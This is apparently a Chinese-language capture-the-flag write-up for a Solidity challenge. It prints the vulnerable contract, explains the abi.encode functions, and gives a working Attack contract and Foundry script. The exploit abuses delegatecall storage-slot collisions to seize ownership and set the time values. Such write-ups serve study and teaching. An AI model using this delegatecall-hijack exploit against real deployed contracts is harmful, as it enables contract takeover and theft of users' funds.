# time

# 源码

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

//主合约
contract EkkoTimeRewind {
    address public owner; //0
    string public constant saying = "U can do Anything in DLNU2025"; //constant不占槽
    bytes4 constant setZDriveownerSignature =
        bytes4(keccak256("setZDriveowner(uint256,uint256)")); //constant不占槽
    address public rewindBeforeTime; //1
    address public rewindAfterTime; //2
    uint256 public Time0; //3
    uint256 public Time1; //4
    bool private isSetZDriveownerCalled = false; //5
    bool private isSetTimeCalled = false; //6
    address public zDriveContractAddress; //7

    constructor(address _zDriveContractAddress) {
        zDriveContractAddress = _zDriveContractAddress;
        rewindBeforeTime = address(this);
        rewindAfterTime = address(this);
        owner = msg.sender;
    }

    function setRewindBeforeTime(uint256 _Time0) public onlyWhitelisted {
        require(!isSetTimeCalled, "setRewindBeforeTime can only be calledonce");
        isSetTimeCalled = true;
        Time0 = _Time0;
    }

    function setRewindAfterTime(uint256 _Time1) public onlyWhitelisted {
        require(!isSetTimeCalled, "setRewindAfterTime can only be called once");
        isSetTimeCalled = true;
        Time1 = _Time1;
    }

    function isSolved() public view returns (bool) {
        return (Time0 != 0 && Time1 != 0 && Time0 > Time1 + 4);
    }

    function setZDriveowner(bytes[] calldata data) public {
        require(
            !isSetZDriveownerCalled,
            "multicallSetZDriveowner has alreadybeen called once"
        );
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (
                !isSetZDriveownerCalled && selector == setZDriveownerSignature
            ) {
                (bool success, ) = zDriveContractAddress.delegatecall(data[i]);

                require(
                    success,
                    "Error while delegating call tosetZDriveowner"
                );
            } else {
                revert("Invalid selector");
            }
        }
        isSetZDriveownerCalled = true;
    }

    function setTime(bytes[] calldata data) public onlyWhitelisted {
        bytes4 rewindBeforeTimeSignature = bytes4(
            keccak256("setRewindBeforeTime(uint256)")
        );
        bytes4 rewindAfterTimeSignature = bytes4(
            keccak256("setRewindAfterTime(uint256)")
        );
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (!isSetTimeCalled && selector == rewindBeforeTimeSignature) {
                (bool success, ) = rewindBeforeTime.delegatecall(data[i]);
                require(
                    success,
                    "Error while delegating call forrewindBeforeTime"
                );
            } else if (
                !isSetTimeCalled && selector == rewindAfterTimeSignature
            ) {
                (bool success, ) = rewindAfterTime.delegatecall(data[i]);
                require(
                    success,
                    "Error while delegating call forrewindAfterTime"
                );
            } else {
                revert("Invalid selector");
            }
        }
    }

    modifier onlyWhitelisted() {
        require(msg.sender == owner, "Not whitelisted");
        _;
    }
}

//委托合约
contract ZDriveContract {
    uint256 public ZDriveowner;//0
    uint256 public Description;//1
    uint256 private callCounter = 0;//2

    event UsefulEvent(string message);

    function setZDriveowner(uint256 _ZDriveowner, uint256 _Description) public {
        ZDriveowner = _ZDriveowner;
        Description = _Description;
        callCounter++;
        emit UsefulEvent("Happy Chinese New Year!");
    }

    function getFlag() public pure returns (string memory) {
        return
            "What are you thinking, kid? Do you really think I can give it to you that easily?";
    }
}

contract Setup {
    EkkoTimeRewind public ekkoTimeRewind;
    ZDriveContract public zDriveContract;

    constructor() {
        zDriveContract = new ZDriveContract();
        ekkoTimeRewind = new EkkoTimeRewind(address(zDriveContract));
    }

    function isSolved() public view returns (bool) {
        return (ekkoTimeRewind.Time0() != 0 &&
            ekkoTimeRewind.Time1() != 0 &&
            ekkoTimeRewind.Time0() > ekkoTimeRewind.Time1() + 4);
    }
}

```

# bytes数组写法

看attack()这一段:

```solidity
 bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodeWithSelector(
            bytes4(keccak256("setZDriveowner(uint256,uint256)")),
            uint256(uint160(address(this))), //delegatecall委托合约,设置address(this)为owner
            uint256(uint160(address(this))) //设置rewindBeforeTime为address(this)
        );

        ekko.setZDriveowner(datas);
        require(ekko.owner() == address(this), "u r notowner"); //检查这步delegatecall是否成功设置address(this)为owner

        bytes[] memory timeDatas = new bytes[](2);
        bytes memory beforeTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindBeforeTime(uint256)")),
            7
        ); //delegatecall到攻击合约自己写的这个函数,设置Time0==7
        bytes memory afterTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindAfterTime(uint256)")),
            2
        ); //delegatecall到攻击合约自己写的这个函数,设置Time1==1
        timeDatas[0] = beforeTime;
        timeDatas[1] = afterTime;
        ekko.setTime(timeDatas);
```

着重注意这种bytes数组怎么写的,格式是什么,写的时候逻辑没啥问题,这个写法卡了好久

# abi.encode四个

源码的两个关键函数`setZDriveowner` 和 `setTime`, 它们都要求传入一个 `bytes[] calldata data`，再通过 `delegatecall` 执行我们传进来的编码数据。这里就要用到 **abi.encode 系列函数**

1. `abi.encode`

按照 ABI 规则，把参数编码成 **标准 ABI 字节数据**（动态长度、32字节对齐）

2. `abi.encodePacked`

把参数按紧凑方式**拼接**,更省gas,不过有哈希碰撞风险

3. `abi.encodeWithSelector`

* 用法:<font style="background-color:#FBDFEF;"> abi.encodeWithSelector(selector, 参数...)  </font>

它会生成 `selector + 参数编码`，正好就是 delegatecall 需要的完整 calldata

```solidity
bytes[] memory timeDatas = new bytes[](2);
        bytes memory beforeTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindBeforeTime(uint256)")),
            7
        ); //delegatecall到攻击合约自己写的这个setRewindBeforeTime()函数
        bytes memory afterTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindAfterTime(uint256)")),
            2
        ); 
        timeDatas[0] = beforeTime;
        timeDatas[1] = afterTime;
        ekko.setTime(timeDatas);
```

4. `abi.encodeWithSignature`

和`abi.encodeWithSelector`类似，不过用函数签名字符串来生成 selector , 一般是动态函数调用（依赖字符串签名）

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {EkkoTimeRewind} from "./1.sol";
import {ZDriveContract} from "./1.sol";

contract Attack {
    address public owner; //0
    address public rewindBeforeTime; //1
    address public rewindAfterTime; //2
    uint256 public Time0; //3
    uint256 public Time1; //4
    bool private isSetZDriveownerCalled = false; //5
    bool private isSetTimeCalled = false; //6
    address public zDriveContractAddress; //7
    EkkoTimeRewind public ekko; //8

    constructor(address addr) {
        ekko = EkkoTimeRewind(addr);
    }

    function setRewindBeforeTime(uint256 _Time0) public {
        Time0 = _Time0;
        rewindAfterTime = address(this); //important!!!因为只设置了rewindBeforeTime为address(this),还差一个rewindAfterTime呢,注意槽位对齐
    }

    function setRewindAfterTime(uint256 _Time1) public {
        Time1 = _Time1;
    }

    function attack() external {
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodeWithSelector(
            bytes4(keccak256("setZDriveowner(uint256,uint256)")),
            uint256(uint160(address(this))), //delegatecall委托合约,设置address(this)为owner
            uint256(uint160(address(this))) //设置rewindBeforeTime为address(this)
        );

        ekko.setZDriveowner(datas);
        require(ekko.owner() == address(this), "u r notowner"); //检查这步delegatecall是否成功设置address(this)为owner

        bytes[] memory timeDatas = new bytes[](2);
        bytes memory beforeTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindBeforeTime(uint256)")),
            7
        ); //delegatecall到攻击合约自己写的这个函数,设置Time0==7
        bytes memory afterTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindAfterTime(uint256)")),
            2
        ); //delegatecall到攻击合约自己写的这个函数,设置Time1==1
        timeDatas[0] = beforeTime;
        timeDatas[1] = afterTime;
        ekko.setTime(timeDatas);

        require(ekko.Time0() == 7, "time0 error");
        require(ekko.Time1() == 2, "time1 error");

        require(ekko.isSolved() == true, "no!!!");
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x9b4cF98D925ffd9D0061023c714889EB517DD472);
        attack.attack();
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-09-11 20:09:47  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/dgxwo112iq3w59el>